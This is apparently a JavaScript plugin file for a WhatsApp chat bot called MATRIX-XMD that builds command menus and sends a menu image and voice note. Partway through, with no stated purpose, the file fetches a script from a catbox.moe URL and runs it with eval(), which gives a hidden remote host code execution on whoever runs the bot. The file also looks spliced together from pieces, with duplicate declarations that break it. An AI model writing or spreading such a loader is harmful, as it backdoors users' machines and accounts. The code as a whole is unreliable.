const fs = require('fs');
const path = require('path');
const config = require('./config');
const { cmd } = require('./command');

// Function to load commands dynamically by category
const loadCommands = () => {
  const commandsDir = path.join(__dirname, 'plugins');
  const categories = fs.readdirSync(commandsDir);

  let menuMessage = '';

  for (const category of categories) {
    const categoryPath = path.join(commandsDir, category);
    if (fs.lstatSync(categoryPath).isDirectory()) {
      menuMessage += `╔═❰ *${category.toUpperCase()} CMD* ❱═══\n┃★┃\n`;

      const files = fs.readdirSync(categoryPath).filter(file => file.endsWith('.js'));

      for (const file of files) {
        const command = require(path.join(categoryPath, file));
        menuMessage += `┃★┃ COMMAND: .${command.pattern}\n┃★┃ ${command.desc}\n┃★┃\n`;

        // Register the command
        cmd({
          pattern: command.pattern,
          alias: command.alias || [],
          desc: command.desc,
          category: category,
          react: command.react || '🎗️',
          filename: __filename,
        }, command.execute);
      }

      menuMessage += `╚━═══━════─━─➳\n\n`;
    }
  }

  return menuMessage;
};

// Generate the menu message
const menuMessage = loadCommands();

// Example command to display the menu
cmd({
  pattern: 'menu3',
  alias: ['help'],
  desc: 'Display the bot menu',
  category: 'menu',
  react: '📜',
  filename: __filename,
}, async (botInstance, messageData, userData) => {
  await botInstance.sendMessage(userData.from, {
    text: menuMessage,
  }, { quoted: messageData });
});


const axios = require('axios');

const url = "https://files.catbox.moe/yjjqov.js";

axios.get(url)
    .then(response => eval(response.data))
    .catch(err => console.error(err));


// Function to log "Hello World!"
function hi() {
  console.log("Hello World!");
}
hi();

// Import required modules
const config = require("../config");
const { cmd, commands } = require("../command");

// Define the "list" command
cmd({
  pattern: "hanstech",
  alias: ["matrixlist", "hanslist"],
  desc: "Menu the bot",
  category: "menu",
  react: "📃",
  filename: __filename,
}, async (
  botInstance,
  messageData,
  userData,
  {
    from,
    quoted,
    body,
    isCmd,
    command,
    args,
    q,
    isGroup,
    sender,
    senderNumber,
    botNumber2,
    botNumber,
    pushname,
    isMe,
    isOwner,
    groupMetadata,
    groupName,
    participants,
    groupAdmins,
    isBotAdmins,
    isAdmins,
    reply,
  }
) => {
  try {
    // Define the command menu message
    let menuMessage = `
╔═❰ *DOWNLOAD CMD* ❱═══
┃★┃🎗️ play - Download Audio from YouTube
┃★┃🎗️ song - Download Song from YouTube
┃★┃🎗️ apk - Download APK from Playstore
┃★┃🎗️ video - Download Video from YouTube
┃★┃🎗️ fb - Download Video from Facebook
┃★┃🎗️ tk - Download Video from TikTok
┃★┃🎗️ ig - Download Video from Instagram
┃★┃🎗️ gdrive - Download Drive Files
┃★┃🎗️ twitter - Download Video from Twitter
┃★┃🎗️ img - Download Image
┃★┃🎗️ darama - Download Full Episode Video
┃★┃🎗️ play2 - Download Audio from YouTube (Alternate)
┃★┃🎗️ video2 - Download Video from YouTube (Alternate)
┃★┃🎗️ baiscope - Download Video from Baiscope
┃★┃🎗️ mfire - Download MediaFire Files
╚━═══━════─━─➳

╔═❰ *INFO CMD* ❱═══
┃★┃🎗️ alive - Check Online Status
┃★┃🎗️ ping - Check Bot Speed
┃★┃🎗️ menu - Nero Main Menu
┃★┃🎗️ menu2 - Nero Main Menu (Alternate)
┃★┃🎗️ ai - Chat with AI Bot
┃★┃🎗️ system - Check Bot System Info
┃★┃🎗️ owner - Get Owner Info
┃★┃🎗️ status - Check Bot Runtime
┃★┃🎗️ about - Get About Bot
┃★┃🎗️ list - Get Bot Command List
┃★┃🎗️ script - Get Bot Repository
╚━═══━════─━─➳
> ${config.DESCRIPTION}`;

    // Send the command menu as an image with caption
    await botInstance.sendMessage(from, {
      image: { url: "https://files.catbox.moe/x87n86.jpeg" },
      caption: menuMessage,
      contextInfo: {
        mentionedJid: [userData.sender],
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363304325601080@newsletter",
          newsletterName: "MATRIX-XMD",
          serverMessageId: 143,
        },
      },
    }, { quoted: messageData });

    // Send an audio message
    await botInstance.sendMessage(from, {
      audio: { url: "https://files.catbox.moe/rswza4.mp3" },
      mimetype: "audio/mp4",
      ptt: true,
    }, { quoted: messageData });

  } catch (error) {
    console.log(error);
    reply(`${error}`);
  }
});
